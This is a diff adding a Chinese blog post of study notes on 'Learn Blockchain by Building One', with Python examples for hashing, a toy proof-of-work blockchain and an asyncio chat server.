@@ -141,6 +141,180 @@ var _hmt = _hmt || [];
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2021/08/07/《Learn-Blockchain-by-Building-One》笔记以及操作/" >《Learn Blockchain by Building One》笔记以及操作</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2021-08-07  </div>
+		</div>
+	</div>
+	
+
+
+			<div class="entry">
+  <div class="row">
+	
+	
+		<blockquote>
+<p>来自Learn Blockchain by Building One的笔记</p>
+</blockquote>
+<h1 id="书本笔记"><a href="#书本笔记" class="headerlink" title="书本笔记"></a>书本笔记</h1><p><img src="/2021/08/07/%E3%80%8ALearn-Blockchain-by-Building-One%E3%80%8B%E7%AC%94%E8%AE%B0%E4%BB%A5%E5%8F%8A%E6%93%8D%E4%BD%9C/%E3%80%8ALearn-Blockchain-by-Building-One%E3%80%8B%E7%AC%94%E8%AE%B0%E4%BB%A5%E5%8F%8A%E6%93%8D%E4%BD%9C%5Cimage-20210801195944516.png" alt="image-20210801195944516"></p>
+<p>122/197</p>
+<h2 id="chapter-1"><a href="#chapter-1" class="headerlink" title="chapter 1"></a>chapter 1</h2><blockquote>
+<p>主要就是讲工具安装（环境搭建）和一个小例子。</p>
+</blockquote>
+<h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p>安装python、poetry</p>
+<h4 id="poetry"><a href="#poetry" class="headerlink" title="poetry"></a>poetry</h4><p>poetry：管理python项目依赖关系</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">poetry new my-project	#用Poetry创建一个Python项目</span><br><span class="line">poetry add requests		#用Poetry添加python的依赖</span><br><span class="line">poetry shell			#Python解释器是不是在Poetry的virtualenv中</span><br></pre></td></tr></table></figure>
+
+<h3 id="example"><a href="#example" class="headerlink" title="example"></a>example</h3><h4 id="获得比特币价格"><a href="#获得比特币价格" class="headerlink" title="获得比特币价格"></a>获得比特币价格</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">response = requests.get(<span class="string">"https://api.coinbase.com/v2/prices/spot?currency=USD"</span>)</span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/08/07/%E3%80%8ALearn-Blockchain-by-Building-One%E3%80%8B%E7%AC%94%E8%AE%B0%E4%BB%A5%E5%8F%8A%E6%93%8D%E4%BD%9C/%E3%80%8ALearn-Blockchain-by-Building-One%E3%80%8B%E7%AC%94%E8%AE%B0%E4%BB%A5%E5%8F%8A%E6%93%8D%E4%BD%9C%5Cimage-20210731164527928.png" alt="image-20210731164527928"></p>
+<h2 id="chapter-2"><a href="#chapter-2" class="headerlink" title="chapter 2"></a>chapter 2</h2><blockquote>
+<p>主要讲hash，题目是“A Way to Identify<br>Everything”，也就是用hash可以验证发送的数据是否被修改</p>
+</blockquote>
+<h3 id="hash"><a href="#hash" class="headerlink" title="hash"></a>hash</h3><h4 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h4><h5 id="1-Hashing-in-Python"><a href="#1-Hashing-in-Python" class="headerlink" title="1 Hashing in Python"></a>1 Hashing in Python</h5><blockquote>
+<p>文字的hash</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="comment"># Hash functions expect bytes as input: the encode() method turns strings to bytes</span></span><br><span class="line">input_bytes = <span class="string">b"backpack"</span></span><br><span class="line">output = hashlib.sha256(input_bytes)</span><br><span class="line"><span class="comment"># We use hexdigest() to convert bytes to hex because it's easier to read</span></span><br><span class="line">print(output.hexdigest())</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/08/07/%E3%80%8ALearn-Blockchain-by-Building-One%E3%80%8B%E7%AC%94%E8%AE%B0%E4%BB%A5%E5%8F%8A%E6%93%8D%E4%BD%9C/%E3%80%8ALearn-Blockchain-by-Building-One%E3%80%8B%E7%AC%94%E8%AE%B0%E4%BB%A5%E5%8F%8A%E6%93%8D%E4%BD%9C%5Cimage-20210731164818639.png" alt="image-20210731164818639"></p>
+<h5 id="2-Hashing-images"><a href="#2-Hashing-images" class="headerlink" title="2 Hashing images"></a>2 Hashing images</h5><blockquote>
+<p>图片的hash</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line">file = open(<span class="string">"my_image.jpg"</span>, <span class="string">"rb"</span>)</span><br><span class="line">hash = sha256(file.read()).hexdigest()</span><br><span class="line">file.close()</span><br><span class="line">print(<span class="string">f"The hash of my file is: <span class="subst">&#123;hash&#125;</span>"</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/08/07/%E3%80%8ALearn-Blockchain-by-Building-One%E3%80%8B%E7%AC%94%E8%AE%B0%E4%BB%A5%E5%8F%8A%E6%93%8D%E4%BD%9C/%E3%80%8ALearn-Blockchain-by-Building-One%E3%80%8B%E7%AC%94%E8%AE%B0%E4%BB%A5%E5%8F%8A%E6%93%8D%E4%BD%9C%5Cimage-20210731165008111.png" alt="image-20210731165008111"></p>
+<h5 id="3-Sending-untamperable-emails"><a href="#3-Sending-untamperable-emails" class="headerlink" title="3 Sending untamperable emails"></a>3 Sending untamperable emails</h5><blockquote>
+<p>加了一部分密文，hash</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line">secret_phrase = <span class="string">"bolognese"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_hash_with_secret_phrase</span><span class="params">(input_data, secret_phrase)</span>:</span></span><br><span class="line">    combined = input_data + secret_phrase</span><br><span class="line">    <span class="keyword">return</span> sha256(combined.encode()).hexdigest()</span><br><span class="line">email_body = <span class="string">"Hey Bob,I think you should learn about Blockchains! I've been investing in Bitcoin and currently have exactly 12.03 BTC in my account."</span></span><br><span class="line">print(get_hash_with_secret_phrase(email_body,  secret_phrase))</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/08/07/%E3%80%8ALearn-Blockchain-by-Building-One%E3%80%8B%E7%AC%94%E8%AE%B0%E4%BB%A5%E5%8F%8A%E6%93%8D%E4%BD%9C/%E3%80%8ALearn-Blockchain-by-Building-One%E3%80%8B%E7%AC%94%E8%AE%B0%E4%BB%A5%E5%8F%8A%E6%93%8D%E4%BD%9C%5Cimage-20210731165316295.png" alt="image-20210731165316295"></p>
+<h2 id="chapter-3"><a href="#chapter-3" class="headerlink" title="chapter 3"></a>chapter 3</h2><blockquote>
+<p>实现区块链的链（修改后的，所以proof_of_work是chapter 4的</p>
+<ul>
+<li><code>__init__</code>：一开始创建初始块</li>
+<li>new_block：创建块</li>
+<li>hash：对块进行hash</li>
+<li>last_block：取最后一个块</li>
+<li>valid_block：判断是否是有效块（前4个是0</li>
+<li>proof_of_work：一直生成块，知道有效块</li>
+</ul>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#blockchain.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Blockchain</span><span class="params">(object)</span>:</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">		self.chain=[]</span><br><span class="line">		self.pending_transactions=[]</span><br><span class="line"></span><br><span class="line">		<span class="comment">#Create the genesis block</span></span><br><span class="line">		print(<span class="string">"Creating genesis block"</span>)</span><br><span class="line">		self.chain.append(self.new_block())</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">new_block</span><span class="params">(self)</span>:</span></span><br><span class="line">		block=&#123;</span><br><span class="line">			<span class="string">'index'</span>:len(self.chain),</span><br><span class="line">			<span class="string">'timestamp'</span>:datetime.utcnow().isoformat(),</span><br><span class="line">			<span class="string">'transactions'</span>:self.pending_transactions,</span><br><span class="line">			<span class="string">'previous_hash'</span>:self.last_block[<span class="string">"hash"</span>] <span class="keyword">if</span> self.last_block <span class="keyword">else</span> <span class="literal">None</span>,</span><br><span class="line">			<span class="string">'nonce'</span>:format(random.getrandbits(<span class="number">64</span>),<span class="string">"x"</span>),</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		block_hash = self.hash(block)</span><br><span class="line">		block[<span class="string">"hash"</span>] = block_hash</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		self.pending_transactions=[]</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> block</span><br><span class="line"></span><br><span class="line"><span class="meta">	@staticmethod</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">hash</span><span class="params">(block)</span>:</span></span><br><span class="line"></span><br><span class="line">		block_string = json.dumps(block,sort_keys=<span class="literal">True</span>).encode()</span><br><span class="line">		<span class="keyword">return</span> sha256(block_string).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="meta">	@property</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">last_block</span><span class="params">(self)</span>:</span></span><br><span class="line">		</span><br><span class="line">		<span class="keyword">return</span> self.chain[<span class="number">-1</span>] <span class="keyword">if</span> self.chain <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="meta">	@staticmethod</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">valid_block</span><span class="params">(block)</span>:</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> block[<span class="string">'hash'</span>].startswith(<span class="string">"0000"</span>)</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span><span class="params">(self)</span>:</span></span><br><span class="line">		<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">			new_block = self.new_block()</span><br><span class="line">			<span class="keyword">if</span> self.valid_block(new_block):</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">		self.chain.append(new_block)</span><br><span class="line">		print(<span class="string">"Found a new block: "</span>,new_block)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/08/07/%E3%80%8ALearn-Blockchain-by-Building-One%E3%80%8B%E7%AC%94%E8%AE%B0%E4%BB%A5%E5%8F%8A%E6%93%8D%E4%BD%9C/%E3%80%8ALearn-Blockchain-by-Building-One%E3%80%8B%E7%AC%94%E8%AE%B0%E4%BB%A5%E5%8F%8A%E6%93%8D%E4%BD%9C%5Cimage-20210731165711500.png" alt="image-20210731165711500"></p>
+<h2 id="chapter-4"><a href="#chapter-4" class="headerlink" title="chapter 4"></a>chapter 4</h2><blockquote>
+<p>题目是工作量证明，</p>
+</blockquote>
+<h3 id="工具-1"><a href="#工具-1" class="headerlink" title="工具"></a>工具</h3><h4 id="ipython"><a href="#ipython" class="headerlink" title="ipython"></a>ipython</h4><ul>
+<li><p>与Python解释器交互的一个很棒的工具</p>
+</li>
+<li><p>使用制表符补全和语法高亮显示</p>
+</li>
+</ul>
+<h3 id="工作量证明"><a href="#工作量证明" class="headerlink" title="工作量证明"></a>工作量证明</h3><p>挖矿：矿工通过找到一个哈希值小于给定值</p>
+<h4 id="example-1"><a href="#example-1" class="headerlink" title="example"></a>example</h4><h5 id="1-easy"><a href="#1-easy" class="headerlink" title="1 easy"></a>1 easy</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line">x = <span class="number">5</span></span><br><span class="line">y = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> sha256(<span class="string">f'<span class="subst">&#123;x*y&#125;</span>'</span>.encode()).hexdigest()[<span class="number">-1</span>] != <span class="string">"0"</span>:</span><br><span class="line">	y += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">f'The solution is y = <span class="subst">&#123;y&#125;</span>'</span>)(funcoin-fVGYERd1-py3<span class="number">.8</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/08/07/%E3%80%8ALearn-Blockchain-by-Building-One%E3%80%8B%E7%AC%94%E8%AE%B0%E4%BB%A5%E5%8F%8A%E6%93%8D%E4%BD%9C/%E3%80%8ALearn-Blockchain-by-Building-One%E3%80%8B%E7%AC%94%E8%AE%B0%E4%BB%A5%E5%8F%8A%E6%93%8D%E4%BD%9C%5Cimage-20210731170111573.png" alt="image-20210731170111573"></p>
+<h5 id="2-应用到blockchain"><a href="#2-应用到blockchain" class="headerlink" title="2 应用到blockchain"></a>2 应用到blockchain</h5><blockquote>
+<p>代码同chapter3</p>
+</blockquote>
+<p><img src="/2021/08/07/%E3%80%8ALearn-Blockchain-by-Building-One%E3%80%8B%E7%AC%94%E8%AE%B0%E4%BB%A5%E5%8F%8A%E6%93%8D%E4%BD%9C/%E3%80%8ALearn-Blockchain-by-Building-One%E3%80%8B%E7%AC%94%E8%AE%B0%E4%BB%A5%E5%8F%8A%E6%93%8D%E4%BD%9C%5Cimage-20210731170314488.png" alt="image-20210731170314488"></p>
+<h2 id="chapter-5"><a href="#chapter-5" class="headerlink" title="chapter 5"></a>chapter 5</h2><blockquote>
+<p>讲的网络，首先讲了异步，然后做了一个简单的聊天，类似于区块链中的通信情况。</p>
+</blockquote>
+<h3 id="异步"><a href="#异步" class="headerlink" title="异步"></a>异步</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">greet</span><span class="params">(name,delay)</span>:</span></span><br><span class="line">	<span class="keyword">await</span> asyncio.sleep(delay)</span><br><span class="line">	print(<span class="string">f'<span class="subst">&#123;name&#125;</span>:I waited <span class="subst">&#123;delay&#125;</span> seconds before saying "hello"'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">	task_1 = asyncio.create_task(greet(<span class="string">"t1"</span>,<span class="number">3</span>))</span><br><span class="line">	task_2 = asyncio.create_task(greet(<span class="string">"t2"</span>,<span class="number">2</span>))</span><br><span class="line">	task_3 = asyncio.create_task(greet(<span class="string">"t3"</span>,<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">	start_time = time.time()</span><br><span class="line">	print(<span class="string">"0.00s: Program Start"</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">await</span> task_1</span><br><span class="line">	<span class="keyword">await</span> task_2</span><br><span class="line">	<span class="keyword">await</span> task_3</span><br><span class="line"></span><br><span class="line">	print(<span class="string">f"<span class="subst">&#123;time.time() - start_time:<span class="number">.2</span>f&#125;</span>s: Program End"</span>)</span><br><span class="line"></span><br><span class="line">asyncio.run(main())</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/08/07/%E3%80%8ALearn-Blockchain-by-Building-One%E3%80%8B%E7%AC%94%E8%AE%B0%E4%BB%A5%E5%8F%8A%E6%93%8D%E4%BD%9C/%E3%80%8ALearn-Blockchain-by-Building-One%E3%80%8B%E7%AC%94%E8%AE%B0%E4%BB%A5%E5%8F%8A%E6%93%8D%E4%BD%9C%5Cimage-20210731171321116.png" alt="image-20210731171321116"></p>
+<h3 id="简易聊天系统"><a href="#简易聊天系统" class="headerlink" title="简易聊天系统"></a>简易聊天系统</h3><p>构造一个通信，类似于区块链的通信</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">from</span> textwrap <span class="keyword">import</span> dedent</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ConnectionPool</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.connection_pool = set()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">send_welcome_message</span><span class="params">(self,writer)</span>:</span></span><br><span class="line">        message = dedent(<span class="string">f"""</span></span><br><span class="line"><span class="string">        ===</span></span><br><span class="line"><span class="string">        Welcome <span class="subst">&#123;writer.nickname&#125;</span>!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        There are <span class="subst">&#123;len(self.connection_pool) - <span class="number">1</span>&#125;</span> user(s) here beside you</span></span><br><span class="line"><span class="string">       </span></span><br><span class="line"><span class="string">        Help:</span></span><br><span class="line"><span class="string">         - Type anything to chat</span></span><br><span class="line"><span class="string">         - /list will list all the connected users</span></span><br><span class="line"><span class="string">         - /quit will disconnect you</span></span><br><span class="line"><span class="string">        ===</span></span><br><span class="line"><span class="string">        """</span>)</span><br><span class="line"></span><br><span class="line">        writer.write(<span class="string">f"<span class="subst">&#123;message&#125;</span>\n"</span>.encode())</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">broadcast</span><span class="params">(self,writer,message)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> user <span class="keyword">in</span> self.connection_pool:</span><br><span class="line">            <span class="keyword">if</span> user != writer:</span><br><span class="line">                <span class="comment"># We don't need to also broadcast to the user sending the message</span></span><br><span class="line">                user.write(<span class="string">f"<span class="subst">&#123;message&#125;</span>\n"</span>.encode())</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">broadcast_user_join</span><span class="params">(self,writer)</span>:</span></span><br><span class="line">        self.broadcast(writer,<span class="string">f"<span class="subst">&#123;writer.nickname&#125;</span> just joined"</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">broadcast_user_quit</span><span class="params">(self,writer)</span>:</span></span><br><span class="line">        self.broadcast(writer,<span class="string">f"<span class="subst">&#123;writer.nickname&#125;</span> just quit"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">broadcast_new_message</span><span class="params">(self,writer,message)</span>:</span></span><br><span class="line">        self.broadcast(writer,<span class="string">f"[<span class="subst">&#123;writer.nickname&#125;</span>] <span class="subst">&#123;message&#125;</span>"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">list_users</span><span class="params">(self,writer)</span>:</span></span><br><span class="line">        message = <span class="string">"===\n"</span></span><br><span class="line">        message += <span class="string">"Currently connected users:"</span></span><br><span class="line">        <span class="keyword">for</span> user <span class="keyword">in</span> self.connection_pool:</span><br><span class="line">            <span class="keyword">if</span> user == writer:</span><br><span class="line">                message += <span class="string">f"\n - <span class="subst">&#123;user.nickname&#125;</span> (you)"</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                message += <span class="string">f"\n - <span class="subst">&#123;user.nickname&#125;</span>"</span></span><br><span class="line"></span><br><span class="line">        message += <span class="string">"\n==="</span></span><br><span class="line">        writer.write(<span class="string">f"<span class="subst">&#123;message&#125;</span>\n"</span>.encode())</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add_new_user_to_pool</span><span class="params">(self, writer)</span>:</span></span><br><span class="line">        self.connection_pool.add(writer)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">remove_user_from_pool</span><span class="params">(self,writer)</span>:</span></span><br><span class="line">        self.connection_pool.remove(writer)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">handle_connection</span><span class="params">(reader,writer)</span>:</span></span><br><span class="line">    <span class="comment"># Get a nickname for the new client</span></span><br><span class="line">    writer.write(<span class="string">"&gt; Choose your nickname: "</span>.encode())</span><br><span class="line"></span><br><span class="line">    response = <span class="keyword">await</span> reader.readuntil(<span class="string">b"\n"</span>)</span><br><span class="line">    writer.nickname = response.decode().strip()</span><br><span class="line"></span><br><span class="line">    connection_pool.add_new_user_to_pool(writer)</span><br><span class="line">    connection_pool.send_welcome_message(writer)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Announce the arrival of this new user</span></span><br><span class="line">    connection_pool.broadcast_user_join(writer)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = <span class="keyword">await</span> reader.readuntil(<span class="string">b"\n"</span>)</span><br><span class="line">        <span class="keyword">except</span> asyncio.exceptions.IncompleteReadError:</span><br><span class="line">            connection_pool.broadcast_user_quit(writer)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        message = data.decode().strip()</span><br><span class="line">        <span class="keyword">if</span> message == <span class="string">"/quit"</span>:</span><br><span class="line">            connection_pool.broadcast_user_quit(writer)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> message == <span class="string">"/list"</span>:</span><br><span class="line">            connection_pool.list_users(writer)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            connection_pool.broadcast_new_message(writer,message)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">await</span> writer.drain()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> writer.is_closing():</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># We're new outside the message loop, and the user has quit.Let's clean up...</span></span><br><span class="line">    writer.close()</span><br><span class="line">    <span class="keyword">await</span> writer.wait_closed()</span><br><span class="line">    connection_pool.remove_user_from_pool(writer)</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    server = <span class="keyword">await</span> asyncio.start_server(handle_connection,<span class="string">"0.0.0.0"</span>,<span class="number">8888</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> server:</span><br><span class="line">        <span class="keyword">await</span> server.serve_forever()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">connection_pool = ConnectionPool()</span><br><span class="line">asyncio.run(main())</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/08/07/%E3%80%8ALearn-Blockchain-by-Building-One%E3%80%8B%E7%AC%94%E8%AE%B0%E4%BB%A5%E5%8F%8A%E6%93%8D%E4%BD%9C/%E3%80%8ALearn-Blockchain-by-Building-One%E3%80%8B%E7%AC%94%E8%AE%B0%E4%BB%A5%E5%8F%8A%E6%93%8D%E4%BD%9C%5Cimage-20210731171000653.png" alt="image-20210731171000653"></p>
+<p><img src="/2021/08/07/%E3%80%8ALearn-Blockchain-by-Building-One%E3%80%8B%E7%AC%94%E8%AE%B0%E4%BB%A5%E5%8F%8A%E6%93%8D%E4%BD%9C/%E3%80%8ALearn-Blockchain-by-Building-One%E3%80%8B%E7%AC%94%E8%AE%B0%E4%BB%A5%E5%8F%8A%E6%93%8D%E4%BD%9C%5Cimage-20210731171014807.png" alt="image-20210731171014807"></p>
+<p><img src="/2021/08/07/%E3%80%8ALearn-Blockchain-by-Building-One%E3%80%8B%E7%AC%94%E8%AE%B0%E4%BB%A5%E5%8F%8A%E6%93%8D%E4%BD%9C/%E3%80%8ALearn-Blockchain-by-Building-One%E3%80%8B%E7%AC%94%E8%AE%B0%E4%BB%A5%E5%8F%8A%E6%93%8D%E4%BD%9C%5Cimage-20210731171025014.png" alt="image-20210731171025014"></p>
+<p><img src="/2021/08/07/%E3%80%8ALearn-Blockchain-by-Building-One%E3%80%8B%E7%AC%94%E8%AE%B0%E4%BB%A5%E5%8F%8A%E6%93%8D%E4%BD%9C/%E3%80%8ALearn-Blockchain-by-Building-One%E3%80%8B%E7%AC%94%E8%AE%B0%E4%BB%A5%E5%8F%8A%E6%93%8D%E4%BD%9C%5Cimage-20210731171036384.png" alt="image-20210731171036384"></p>
+<h2 id="chapter-6"><a href="#chapter-6" class="headerlink" title="chapter 6"></a>chapter 6</h2><blockquote>
+<p>加密</p>
+</blockquote>
